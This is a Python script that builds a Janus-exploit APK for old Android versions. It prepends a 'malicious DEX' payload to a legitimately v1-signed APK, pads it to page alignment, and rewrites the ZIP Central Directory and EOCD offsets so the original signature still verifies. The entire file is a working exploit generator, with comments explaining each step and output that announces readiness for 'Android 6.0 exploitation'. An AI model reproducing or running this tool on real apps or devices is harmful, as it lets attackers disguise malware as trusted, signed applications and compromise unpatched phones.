## make_janus_proper.py - Correct Janus APK with preserved ZIP structure

## Takes in v1_signed apk, malicious DEX, and outputs a Janus APK

import struct, sys, os, zlib

# Argument check
if len(sys.argv) != 4:
    sys.exit("Usage: make_janus_proper.py  <original.apk>  <payload.dex>  <output.apk>")

orig_apk, payload_dex, out_apk = sys.argv[1:]

# Read files
with open(orig_apk, 'rb') as f:
    orig_data = f.read()
with open(payload_dex, 'rb') as f:
    dex_data = f.read()

## Display size of entered files to validate
print(f"📱 Original APK: {len(orig_data)} bytes")
print(f"💣 Malicious DEX: {len(dex_data)} bytes")


## Android requires DEX files to be aligned to page boundaries (4096 bytes)
## Therefore we need to pad and shift accordingly
## The goal After Janus:
# E.g.
# Offset 0:    [Malicious DEX - 2332 bytes]
# Offset 2332: [Zero padding - 1764 bytes]
# Offset 4096: [Original ZIP data starts here]

# Here, I will calculate the 4096-byte alignment for the prepended DEX
alignment = 4096
aligned_dex_size = ((len(dex_data) + alignment - 1) // alignment) * alignment
padding_needed = aligned_dex_size - len(dex_data)
shift_amount = aligned_dex_size

print(f"📐 DEX alignment: {len(dex_data)} → {aligned_dex_size} bytes (+{padding_needed} padding)")
print(f"🔧 All ZIP offsets will shift by {shift_amount} bytes")

## End of Central Directory (EOCD) is the table of contents at the end of every ZIP file
## [File Data][File Data][File Data]...[Central Directory][EOCD] <-- This is a sample structure
# Finding EOCD
eocd_sig = b'PK\x05\x06' ## This is the EOCD signature, magic bytes
eocd_offset = orig_data.rfind(eocd_sig)
if eocd_offset == -1:
    sys.exit("❌ EOCD not found - not a valid ZIP/APK")

print(f"📍 Found EOCD at offset: 0x{eocd_offset:08x}")



# Parse EOCD to extract Central Directory info
eocd_data = orig_data[eocd_offset:eocd_offset+22]
(disk_num, disk_cd, disk_entries, total_entries, cd_size, cd_offset) = struct.unpack('<HHHHII', eocd_data[4:20])

print(f"📊 Central Directory: {total_entries} entries, size={cd_size}, offset=0x{cd_offset:08x}")

cd_start = cd_offset
cd_end = cd_start + cd_size


## To ensure every file is properly shifted, will loop though the Central Directory entries
# Parse and update Central Directory entries
print("🔧 Updating Central Directory offsets...")
cd_data = bytearray(orig_data[cd_start:cd_end])
entry_pos = 0

for i in range(total_entries):
    if cd_data[entry_pos:entry_pos+4] != b'PK\x01\x02':
        sys.exit(f"❌ Bad Central Directory signature at entry {i}")

    # Get current local header offset (at +42 in CD entry)
    current_offset = struct.unpack('<I', cd_data[entry_pos + 42 : entry_pos + 46])[0]
    new_offset = current_offset + shift_amount

    # Update the offset
    struct.pack_into('<I', cd_data, entry_pos+42, new_offset)

    # Move to next entry
    filename_len, extra_len, comment_len = struct.unpack('<HHH', cd_data[entry_pos + 28 : entry_pos + 34])
    entry_pos += 46 + filename_len + extra_len + comment_len

print(f"✅ Updated {total_entries} Central Directory entries")

# Update EOCD with new Central Directory offset
new_cd_offset = cd_offset + shift_amount
updated_eocd = bytearray(orig_data[eocd_offset:eocd_offset + 22])
struct.pack_into('<I', updated_eocd, 16, new_cd_offset)

print(f"🔧 Updated EOCD: CD offset 0x{cd_offset:08x} → 0x{new_cd_offset:08x}")

# Writing the Janus APK
print("🚀 Creating Janus APK...")
with open(out_apk, 'wb') as f:
    # 1. Write malicious DEX at the beginning
    f.write(dex_data)

    # 2. Add zero padding to align to 4096 bytes
    if padding_needed > 0:
        f.write(b'\x00' * padding_needed)

    # 3. After Malicious dex is original APK data up to Central Directory
    f.write(orig_data[:cd_start])

    # 4. Write updated Central Directory
    f.write(cd_data)

    # 5. Write updated EOCD
    f.write(updated_eocd)

    # 6. Write any EOCD comment (if exists)
    eocd_comment = orig_data[eocd_offset + 22:]
    if eocd_comment:
        f.write(eocd_comment)

final_size = os.path.getsize(out_apk)
print(f"✅ Created: {out_apk}")
print(f"📊 Final size: {final_size} bytes (+{shift_amount} from original)")
print(f"🎯 Structure:")
print(f"   💣 Malicious DEX: 0x00000000 - 0x{aligned_dex_size-1:08x}")
print(f"   📦 Original APK:  0x{aligned_dex_size:08x} - 0x{final_size-1:08x}")
print(f"   📁 Central Dir:   0x{new_cd_offset:08x}")
print(f"🚨 Ready for Android 6.0 (2016-09-06) exploitation!")
